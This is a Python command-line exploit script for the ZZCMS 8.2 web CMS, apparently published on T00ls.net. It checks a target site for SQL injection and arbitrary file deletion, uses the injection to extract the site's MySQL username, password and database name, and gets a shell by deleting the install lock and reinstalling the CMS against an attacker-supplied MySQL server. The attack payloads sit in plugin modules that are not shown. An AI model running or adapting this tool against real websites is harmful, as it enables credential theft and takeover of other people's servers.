Author = "AdminTony"
Time = "2018.02.14"
Github = "https://github.com/admintony/ZZCMS_V8.2_GETSHELL"
Copyright = "From T00ls.net"

import sys,os,optparse,re

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
#print(sys.path)

from plugin import injection
from plugin import vulVerification
from plugin import getshell

if __name__ == '__main__':

    opt = optparse.OptionParser()
    opt.add_option("-u","--url",action="store",dest="url",
                   help="The target url")
    opt.add_option("--info",action="store_true",dest="info",
                   help="Injection the MySQL informations")
    opt.add_option("-H","--host",action="store",dest="host",
                   help="The host of your new MySQL , default is 3306 port")
    opt.add_option("-U","--User",action="store",dest="user",
                   help="The user of your new MySQL")
    opt.add_option("-P", "--password", action="store", dest="pwd",
                   help="The password of your new MySQL")
    (options, args) = opt.parse_args()
    #print(len(sys.argv))
    if len(sys.argv)==3:
        # 检测是否存在漏洞
        flag = 1
    elif len(sys.argv)==4:
        # 注入MySQL的信息
        flag = 2
    elif len(sys.argv)==9:
        # Getshell
        flag = 3
    else:
        print("""===========================================================
* Author : AdminTony
* Date : 2018.02.16
* Github : https://github.com/admintony/ZZCMS_V8.2_GETSHELL
* 首发 : https://www.t00ls.net
* Useage : {} -h
===========================================================""".format(sys.argv[0]))
        sys.exit()
    # 处理Target URL
    if "http://" in options.url or "https://" in options.url:
        url = options.url
    else:
        url = "http://"+options.url

    if flag == 1:
        val = vulVerification.sqlTest(url)
        if val.sqltest() == 1:
            print("[+] 目标站点存在SQL注入")
            val_sql = 1
        else:
            print("[-] 目标站点不存在SQL注入")
            val_sql = 0
        val_del = vulVerification.delTest(url)
        if val_del.deltest() == 1:
            print("[+] 目标站点存在任意文件删除漏洞")
            val_del = 1
        else:
            val_del = 0
            print("[-] 目标站点不存在任意文件删除漏洞")
        if val_sql == 1 and val_del == 1:
            print("[+] 目标站点可尝试GETSHELL")
        elif val_sql == 0 and val_del == 1:
            print("[+] 无法获取到目标站点数据库信息，建议不要重装GETSHELL")
        elif val_sql == 1 and val_del == 0:
            print("[+] 无法重装CMS GETSHELL,但可从注入尝试")
        else:
            print("[-] 无法GETSHELL")
    elif flag == 2:
        inject = injection.inject(url)
        username = inject.getUser()
        print(username)
        dbname = inject.getDBName()
        print(dbname)
        password = inject.getPass()
        print("[+] MySQL 的用户名为："+username)
        if password!=None:
            print("[+] MySQL 的用户名 {} 的密码为：".format(username)+password)
        else:
            print("[+] MySQL 的用户名 {} 的密码为：".format(username) + str(password))
        print("[+] MySQL 的数据库名为："+dbname)
    elif flag == 3:
        # 处理MySQL的host
        if "http://" in options.host or "https://" in options.host:
            print("[-] 请去掉MySQL Host前http:// 或者 https://")
            sys.exit()
        else:
            list = options.host.split(":")
            if len(list) == 1:
                host = list[0]
                port = 3306
            else :
                host = list[0]
                port = list[1]

        shell = getshell.getShell(url,host,options.user,options.pwd,port)
        shell.delInstall()
        shell.install()
    #url = "http://127.0.0.1"
    #shell = getshell.getShell(url,"localhost","root","root","3306")
    #shell.delInstall()
    #shell.install()
    """
    inject = injection.inject(url)
    username = inject.getUser()
    print(username)
    #dbname = inject.getDBName()
    #print(dbname)
    password = inject.getPass()
    print(username)
    print(password)
    #print(dbname)

    url = "http://127.0.0.1/"
    val = vulVerification.sqlTest(url)
    if val.sqltest() == 1 :
        print("[+] 目标站点存在SQL注入")
        val_sql = 1
    else :
        print("[-] 目标站点不存在SQL注入")
        val_sql = 0
    url = "http://127.0.0.1/"
    val_del = vulVerification.delTest(url)
    if val_del.deltest() ==1 :
        print("[+] 目标站点存在任意文件删除漏洞")
        val_del = 1
    else :
        val_del=0
        print("[-] 目标站点不存在任意文件删除漏洞")
    if val_sql==1 and val_del == 1:
        print("[+] 目标站点可尝试GETSHELL")
    elif val_sql==0 and val_del==1:
        print("[+] 无法获取到目标站点数据库信息，建议不要重装GETSHELL")
    elif val_sql==1 and val_del==0:
        print("[+] 无法重装CMS GETSHELL,但可从注入尝试")
    else:
        print("[-] 无法GETSHELL")
    #injec = injection.inject(url)
    #injec.getLen("user()")
"""